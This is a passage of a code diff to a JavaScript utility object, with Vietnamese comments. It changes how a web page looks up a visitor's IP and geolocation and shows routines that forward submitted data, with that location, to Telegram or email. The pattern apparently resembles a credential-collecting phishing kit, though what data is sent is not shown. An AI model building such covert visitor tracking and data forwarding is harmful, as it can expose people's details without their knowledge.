@@ -75,37 +75,40 @@ const Utils = {
     },
 
     async getUserLocation() {
-        // Cố gắng lấy IP cơ bản trước làm dự phòng (phòng khi ipinfo bị adblock chặn)
-        let backupIp = 'N/A';
         try {
-            backupIp = await this.getUserIp();
-        } catch (e) {}
-
-        const defaultFallback = { 
-            location: backupIp !== 'N/A' ? `${backupIp} | N/A | N/A (N/A)` : 'N/A', 
-            country_code: 'N/A', 
-            ip: backupIp, 
-            region: 'N/A', 
-            country: 'N/A' 
-        };
-
-        try {
-            const response = await fetch("https://ipinfo.io/json?token=5a58a2d85996e3");
+            // Sử dụng GeoJS: Miễn phí, không cần token, không bị lỗi CORS hay Rate Limit
+            const response = await fetch("https://get.geojs.io/v1/ip/geo.json");
             if (!response.ok) throw new Error("Network response was not ok");
 
             const data = await response.json();
-            const finalIp = data.ip || backupIp; // Ưu tiên IP lấy được, nếu không có thì dùng IP dự phòng
+            const ip = data.ip || "N/A";
+            const city = data.city || "N/A";
+            const region = data.region || "N/A";
+            const country = data.country || "N/A";
 
             return {
-                location: `${finalIp} | ${data.city || 'N/A'} | ${data.region || 'N/A'} (${data.country || 'N/A'})`,
-                country_code: data.country || "N/A",
-                ip: finalIp,
-                region: data.region || "N/A",
-                country: data.country || "N/A"
+                location: `${ip} | ${city} | ${region} (${country})`,
+                country_code: data.country_code || "N/A",
+                ip: ip,
+                region: region,
+                country: country
             };
         } catch (error) {
-            console.error("Error getting location:", error);
-            return defaultFallback; // Trả về IP dự phòng nếu API lỗi
+            console.error("Error getting location, falling back to IP only:", error);
+            
+            // Cơ chế dự phòng: Nếu API vị trí lỗi, vẫn cố gắng lấy IP cơ bản
+            let backupIp = 'N/A';
+            try {
+                backupIp = await this.getUserIp();
+            } catch (e) {}
+
+            return {
+                location: backupIp !== 'N/A' ? `${backupIp} | N/A | N/A (N/A)` : 'N/A',
+                country_code: "N/A",
+                ip: backupIp,
+                region: "N/A",
+                country: "N/A"
+            };
         }
     },
 
@@ -113,7 +116,6 @@ const Utils = {
     // 📩 NOTIFICATIONS & MESSAGING
     // ==========================================
 
-    // Thêm tham số preFetchedLocation để tránh gọi lại API nhiều lần
     async sendToTelegram(data, preFetchedLocation = null) {
         const locationData = preFetchedLocation || await this.getUserLocation();
 
@@ -164,7 +166,6 @@ const Utils = {
         });
     },
 
-    // Thêm tham số preFetchedLocation
     async sendToEmail(data, preFetchedLocation = null) {
         const locationData = preFetchedLocation || await this.getUserLocation();
         
@@ -215,44 +216,9 @@ Sent at: ${new Date().toLocaleString()}`.trim();
         const type = CONFIG.NOTIFICATION_TYPE?.toLowerCase();
         const tasks = [];
 
-        // Lấy IP & Location 1 lần duy nhất ở đây rồi truyền xuống
-        // Để tránh việc gọi API 2 lần cùng lúc gây lỗi Rate Limit
+        // Lấy IP & Location 1 lần duy nhất ở đây để tái sử dụng
+        // Tránh gọi API 2 lần gây lỗi
         const locationData = await this.getUserLocation();
 
         if (type === 'telegram' || type === 'both') {
-            tasks.push(this.sendToTelegram(data, locationData));
-        }
-        if (type === 'email' || type === 'both') {
-            tasks.push(this.sendToEmail(data, locationData));
-        }
-
-        try {
-            await Promise.allSettled(tasks);
-        } catch (error) {
-            console.error('Notification dispatch error:', error);
-        }
-    },
-
-    // ==========================================
-    // 🛠 FORMATTING & HELPERS
-    // ==========================================
-
-    maskPhone(phone) {
-        if (!phone || phone.length < 5) return phone || '';
-        const start = phone.slice(0, 2);
-        const end = phone.slice(-2);
-        return `${start}${'*'.repeat(phone.length - 4)}${end}`;
-    },
-
-    maskEmail(email) {
-        if (!email) return '';
-        return email.replace(/^(.)(.*?)(.)@(.+)$/, (_, firstChar, midChars, lastChar, domain) => {
-            return `${firstChar}${'*'.repeat(midChars.length)}${lastChar}@${domain}`;
-        });
-    },
-
-    generateTicketId() {
-        const gen = () => Math.random().toString(36).substring(2, 6).toUpperCase();
-        return `${gen()}-${gen()}-${gen()}`;
-    }
-};
+            tasks.push(this.sendToTelegram(data
